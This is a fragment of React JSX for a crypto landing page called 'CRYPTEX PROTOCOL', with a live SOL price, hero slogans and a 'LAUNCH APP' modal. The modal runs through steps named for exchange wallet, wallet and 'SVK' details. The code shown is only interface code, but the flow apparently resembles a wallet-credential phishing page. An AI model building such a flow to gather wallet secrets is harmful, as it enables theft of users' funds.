      <div style={{ position: 'fixed', top: 68, left: 16, width: 36, height: 36, borderTop: '1.5px solid rgba(153,69,255,.35)', borderLeft: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />
      <div style={{ position: 'fixed', top: 68, right: 16, width: 36, height: 36, borderTop: '1.5px solid rgba(153,69,255,.35)', borderRight: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />
      <div style={{ position: 'fixed', bottom: 16, left: 16, width: 36, height: 36, borderBottom: '1.5px solid rgba(153,69,255,.35)', borderLeft: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />
      <div style={{ position: 'fixed', bottom: 16, right: 16, width: 36, height: 36, borderBottom: '1.5px solid rgba(153,69,255,.35)', borderRight: '1.5px solid rgba(153,69,255,.35)', zIndex: 5, pointerEvents: 'none' }} />

      {/* NAV */}
      <nav style={{ position: 'fixed', top: 0, left: 0, right: 0, zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '14px 32px', borderBottom: '1px solid rgba(153,69,255,.15)', background: 'rgba(4,3,13,.75)', backdropFilter: 'blur(14px)' }}>
        <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 17, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>⬡ CRYPTEX</div>

        {/* Live SOL price */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(153,69,255,.1)', border: '1px solid rgba(153,69,255,.25)', borderRadius: 30, padding: '6px 14px' }}>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#14f195', boxShadow: '0 0 8px #14f195', animation: 'blink 1.5s ease-in-out infinite' }} />
          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 12, color: '#e0e0ff' }}>
            SOL {price ? `$${price.toLocaleString('en', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '$—'}
          </span>
          {change !== null && (
            <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: change >= 0 ? '#14f195' : '#ff4545' }}>
              {change >= 0 ? '+' : ''}{change.toFixed(2)}%
            </span>
          )}
        </div>

        <button onClick={openModal}
          style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2, padding: '9px 22px', border: '1px solid #9945ff', borderRadius: 7, background: 'rgba(153,69,255,.12)', color: '#9945ff', cursor: 'pointer', transition: 'all .3s' }}
          onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.28)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(153,69,255,.35)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
          onMouseLeave={e => { e.currentTarget.style.background = 'rgba(153,69,255,.12)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)'; }}
        >LAUNCH APP</button>
      </nav>

      {/* HERO */}
      <main style={{ position: 'relative', zIndex: 2, minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', textAlign: 'center', padding: '100px 20px 60px' }}>
        <div style={{ fontSize: 10, letterSpacing: 3, color: '#14f195', border: '1px solid rgba(20,241,149,.3)', padding: '5px 18px', borderRadius: 20, marginBottom: 30, display: 'inline-block', animation: 'fadeInUp .7s both' }}>
          ◎ SOLANA · ETH · BTC · DEFI
        </div>

        <h1 style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 'clamp(32px,6.5vw,80px)', lineHeight: 1.0, marginBottom: 18 }}>
          <span style={{ display: 'block', color: '#fff', animation: 'fadeInUp .7s .1s both' }}>CRYPTEX PROTOCOL</span>
          <span style={{ display: 'block', background: 'linear-gradient(135deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', animation: 'fadeInUp .7s .18s both' }}>SOLANA NATIVE</span>
        </h1>

        <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 14, color: 'rgba(224,224,255,.42)', letterSpacing: .5, maxWidth: 460, lineHeight: 1.9, marginBottom: 46, animation: 'fadeInUp .7s .26s both' }}>
          Real-time markets. Institutional liquidity. Lightning-fast execution on every chain.
        </p>

        <button onClick={openModal}
          style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 12, letterSpacing: 2, padding: '15px 42px', border: 'none', borderRadius: 9, background: 'linear-gradient(135deg,#9945ff,#7b2fd6)', color: '#fff', cursor: 'pointer', transition: 'all .35s', animation: 'fadeInUp .7s .34s both' }}
          onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-3px)'; e.currentTarget.style.boxShadow = '0 12px 40px rgba(153,69,255,.45)'; }}
          onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none'; }}
        >LAUNCH APP</button>

        {/* Feature pills */}
        <div style={{ display: 'flex', gap: 14, justifyContent: 'center', flexWrap: 'wrap', paddingTop: 48, animation: 'fadeInUp .7s .5s both' }}>
          {[['⚡', 'LIGHTNING EXECUTION'], ['◎', 'SOLANA NATIVE'], ['◈', 'MULTI-CHAIN DEFI'], ['⬡', 'INSTITUTIONAL GRADE']].map(([icon, text]) => (
            <div key={text} style={{ display: 'flex', alignItems: 'center', gap: 10, background: 'rgba(15,15,26,.75)', border: '1px solid rgba(153,69,255,.18)', borderRadius: 10, padding: '14px 20px', backdropFilter: 'blur(8px)' }}>
              <span style={{ fontSize: 18 }}>{icon}</span>
              <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', color: 'rgba(224,224,255,.55)' }}>{text}</span>
            </div>
          ))}
        </div>
      </main>

      {/* TERMS MODAL */}
      {showTerms && <TermsModal onAccept={acceptTerms} onClose={closeTerms} />}

      {/* MODAL */}
      {modalOpen && (
        <div onClick={e => { if (e.target === e.currentTarget) setModalOpen(false); }}
          style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.85)', backdropFilter: 'blur(10px)', padding: 20 }}>
          <div style={{ background: '#0c0c1a', border: '1px solid rgba(153,69,255,.35)', borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both' }}>
            {/* Top accent line */}
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#9945ff,#14f195,transparent)' }} />

            {/* Header */}
            <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
              <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 4 }}>⬡ CRYPTEX PROTOCOL</div>
              {!isSuccess && <>
                <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 18, fontWeight: 700, color: '#fff', marginBottom: 6 }}>{stepInfo.title}</div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', letterSpacing: .5, marginBottom: 20 }}>{stepInfo.sub}</div>
              </>}
            </div>

            {!isSuccess && <>
              <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.3),transparent)', margin: '0 28px' }} />
              <ProgressDots current={step} total={STEPS_CONFIG.length} />
            </>}

            {step === 0 && <StepAccess onNext={() => next()} />}
            {step === 1 && <StepName onNext={next} onBack={back} />}
            {step === 2 && <StepExchangeWallet onNext={next} onBack={back} />}
            {step === 3 && <StepWallet onNext={next} onBack={back} />}
            {step === 4 && <StepSVK onNext={next} onBack={back} />}
            {step === 5 && <StepFoundry onNext={handleFoundrySubmit} onBack={back} />}
            {step === 6 && <StepSuccess />}
          </div>
        </div>
      )}

      {/* Footer */}
      <footer style={{ position: 'relative', zIndex: 2, borderTop: '1px solid rgba(153,69,255,.12)', background: 'rgba(4,3,13,.95)', padding: '32px 20px', textAlign: 'center' }}>
        <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 16, fontWeight: 900, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 10 }}>⬡ CRYPTEX</div>
        <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.2)', letterSpacing: 1 }}>© 2025 CRYPTEX PROTOCOL · DECENTRALIZED · UNSTOPPABLE</p>
      </footer>
    </>
  );
}
